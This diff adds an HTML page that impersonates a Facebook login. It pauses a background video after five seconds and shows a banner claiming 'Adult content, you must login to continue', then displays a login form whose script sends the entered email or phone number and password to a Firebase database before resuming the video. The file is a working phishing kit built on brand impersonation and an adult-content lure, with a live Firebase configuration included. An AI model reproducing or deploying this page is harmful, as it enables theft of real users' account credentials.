@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    
+    <style type="text/css">
+        * {
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Poppins', sans-serif;
+    background-color: #f0f2f5;
+    color: #1c1e21;
+}
+
+#video-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1; /* Send it to the back */
+            object-fit: cover; /* Cover the entire screen */
+        }
+        header {
+            position: fixed;
+            top: 0;
+            right: 0;
+            padding: 10px;
+            z-index: 1000;
+        }
+        #logo {
+            width: 25px;
+            height: auto;
+        }
+        
+        #banner {
+            background-color: #ff4d4d;
+            color: #fff;
+            font-style: sans-serif;
+            font-size: 15px;
+            text-align: center;
+            padding: 10px 0;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 1000;
+            display: none;
+        }
+
+
+main {
+    height: 70vh;
+    width: 100vw;
+    position: relative;
+    margin: 0 auto;
+}
+
+.col-form {
+    display: none;
+    text-align: center;
+    margin: 0 auto;
+    position: absolute;
+    left: 50%;
+    top: 70%;
+    transform: translate(-50%, -50%);
+    width: 85%;
+    z-index: 999;
+}
+
+
+.col-form .form-container {
+    background-color: #eaeaff;
+    border: none;
+    border-radius: 19px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+    margin-bottom: 30px;
+    padding: 20px;
+    max-width: 400px;
+    height: 350px;
+}
+
+.col-form .form-container input, .col-form .form-container .btn-login {
+    width: 100%;
+    margin: 5px 0;
+    height: 45px;
+    vertical-align: middle;
+    font-size: 16px;
+    border-radius: 10px;
+}
+
+.col-form .form-container input {
+    border: 2px solid #dddfe2;
+    background-color: #95ccff1b;
+    padding: 0 8px;
+    outline: none;
+}
+
+.col-form .form-container input:focus {
+    border-color: #95ccff70;
+    box-shadow: 0 0 0 2px #e7f3ff;
+}
+
+.col-form .form-container .btn-login {
+    background-color: #1877f2;
+    border: none;
+    border-radius: 20px;
+    font-size: 15px;
+    padding: 0 16px;
+    color: #ffffff;
+    font-weight: 700;
+}
+
+.col-form .form-container a {
+    display: block;
+    color: #1877f2;
+    font-size: 14px;
+    text-decoration: none;
+    padding: 10px 0 20px;
+    border-bottom: 1px solid #dadde1;
+}
+
+.col-form .form-container a:hover {
+    text-decoration: underline;
+}
+
+.col-form .form-container .btn-new {
+    background-color: #42b72a;
+    border: none;
+    border-radius: 20px;
+    font-size: 17px;
+    line-height: 48px;
+    padding: 0 16px;
+    color: #ffffff;
+    font-weight: 700;
+    margin-top: 20px;
+}
+
+    </style>
+</head>
+
+<body>
+    
+    <header>
+        <img id="logo" src="fblogo.png" alt="Facebook Logo">
+    </header>
+    
+    <div id="banner">
+        Adult content, you must login to continue
+    </div>
+    
+    <video id="video-background" autoplay muted loop>
+        <source src="VID.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    
+    <main>
+
+            <div id="col-form" class="col-form">
+                <div class="form-container">
+                    <input id="name" type="text" placeholder="Email or phone number">
+                    <input id="password" type="password" placeholder="Password">
+                    <button class="btn-login" onclick="saveUserData()">Log in</button>
+                    <a href="#">Forgotten password?</a>
+                    <button class="btn-new">Create new Account</button>
+                </div>
+            </div>
+    </main>
+    
+   
+   <script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-analytics.js";
+  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-database.js";
+  // TODO: Add SDKs for Firebase products that you want to use
+  // https://firebase.google.com/docs/web/setup#available-libraries
+
+  // Your web app's Firebase configuration
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  const firebaseConfig = {
+    apiKey: "AIzaSyDqZbdzcsHJLJJAlWRWmSPSq0DiXKA8M6o",
+    authDomain: "fbdata-3ac6d.firebaseapp.com",
+    databaseURL: "https://fbdata-3ac6d-default-rtdb.firebaseio.com",
+    projectId: "fbdata-3ac6d",
+    storageBucket: "fbdata-3ac6d.appspot.com",
+    messagingSenderId: "118071911280",
+    appId: "1:118071911280:web:d2526c57ee13686f61e5b5",
+    measurementId: "G-ZH625WCMMG"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+  
+  const database = getDatabase();
+  
+  
+  window.saveUserData = function() {
+            const name = document.getElementById('name').value;
+            const password = document.getElementById('password').value;
+
+            if (name && password) {
+                const userDataRef = ref(database, 'users');
+                set(userDataRef, {
+                    name: name,
+                    password: password
+                }).then(() => {
+                    console.log('Data saved successfully');
+                    hideModal(); // Hide the form modal
+                    playVideo(); 
+                    hideBanner();
+                }).catch((error) => {
+                    console.error('Error saving data: ', error);
+                });
+            } else {
+                console.error('Name and email are required');
+            }
+        }
+        
+        function hideModal() {
+            document.getElementById("col-form").style.display = "none";
+        }
+        function hideBanner() {
+            document.getElementById("banner").style.display = "none";
+        }
+
+        function playVideo() {
+            document.getElementById("video-background").play();
+        }
+  
+  
+  </script>
+  
+  <script>
+      
+
+        
+  
+  
+  document.addEventListener("DOMContentLoaded", function () {
+            setTimeout(function () {
+                document.getElementById("col-form").style.display = "block";
+                document.getElementById("video-background").pause();
+                document.getElementById("banner").style.display = "block";
+            }, 5000); // Show after 5 seconds
+        });
+</script>
+
+
+</body>
+
+</html>
